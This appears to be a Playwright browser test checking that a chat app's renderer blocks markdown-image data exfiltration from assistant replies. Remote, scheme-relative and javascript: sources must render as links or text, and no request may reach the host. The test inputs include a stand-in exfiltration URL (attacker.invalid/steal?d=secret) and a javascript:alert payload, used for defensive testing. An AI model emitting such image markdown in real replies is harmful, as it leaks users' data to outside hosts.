import { FIXTURE } from "../support/fixtures.ts";
import { expect, type Page, test } from "./fixtures.ts";

/**
 * Assistant markdown must not make the browser fetch attacker-chosen URLs: only same-origin
 * /api/blob/ and data:image/ sources render as <img>, anything else is shown as a link (no model call).
 */

const PNG_1X1 =
	"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
const BLOB = `/api/blob/${"ab".repeat(32)}`;

const MARKDOWN = [
	"![remote tracker](https://attacker.invalid/steal?d=secret)",
	"![scheme-relative](//attacker.invalid/p.png)",
	"![scripty](javascript:alert(1))",
	"![other same-origin file](/favicon.png)",
	`![inline pixel](${PNG_1X1})`,
	`![stored attachment](${BLOB})`,
].join("\n\n");

/** Opens the alpha fixture with its first assistant reply replaced by `markdown` (the chat reads history from /api/family). */
async function openWithMarkdown(page: Page, markdown: string) {
	await page.route("**/api/family?*", async (route) => {
		const res = await route.fetch();
		const data = await res.json();
		for (const member of data.members) {
			for (const e of member.entries) {
				if (e.id === "f0000003") e.message.content = [{ type: "text", text: markdown }];
			}
		}
		await route.fulfill({ response: res, json: data });
	});
	await page.goto("/");
	await page.locator('[data-testid="session-item"]', { hasText: FIXTURE.alphaTitle }).click();
	await expect(page.getByTestId("chat-title")).toHaveText(FIXTURE.alphaTitle);
}

test("remote and unsafe markdown images never become <img> or a request; allowed sources do", async ({ page }) => {
	const requested: string[] = [];
	page.on("request", (r) => requested.push(r.url()));
	// Fail loudly if the browser tries anyway.
	await page.route("https://attacker.invalid/**", (route) => route.abort());
	await openWithMarkdown(page, MARKDOWN);
	const reply = page.locator('[data-testid="msg-assistant"]').first();

	// Allowed: an inline image and a stored attachment render as images.
	const pixel = reply.getByRole("img", { name: "inline pixel" });
	await expect(pixel).toBeVisible();
	await expect.poll(() => pixel.evaluate((img: HTMLImageElement) => img.naturalWidth)).toBe(1);
	await expect(reply.getByRole("img", { name: "stored attachment" })).toHaveAttribute("src", BLOB);

	// Everything else is a link, not an image.
	await expect(reply.locator("img")).toHaveCount(2);
	const remote = reply.getByRole("link", { name: "remote tracker" });
	await expect(remote).toHaveAttribute("href", "https://attacker.invalid/steal?d=secret");
	await expect(remote).toHaveAttribute("target", "_blank");
	await expect(remote).toHaveAttribute("rel", /noreferrer/);
	// Another host on the page's scheme opens over https; a path of this server is no link (it opened the app again).
	await expect(reply.getByRole("link", { name: "scheme-relative" })).toHaveAttribute(
		"href",
		"https://attacker.invalid/p.png",
	);
	await expect(reply.getByRole("link", { name: "other same-origin file" })).toHaveCount(0);
	await expect(reply).toContainText("other same-origin file");

	// A javascript: source must not turn into a clickable javascript: link.
	await expect(reply.locator('a[href^="javascript:"]')).toHaveCount(0);
	await expect(reply).toContainText("scripty");

	// Rendering finished (the allowed image decoded); nothing asked the attacker's host for anything.
	expect(requested.filter((u) => u.includes("attacker.invalid"))).toEqual([]);
});
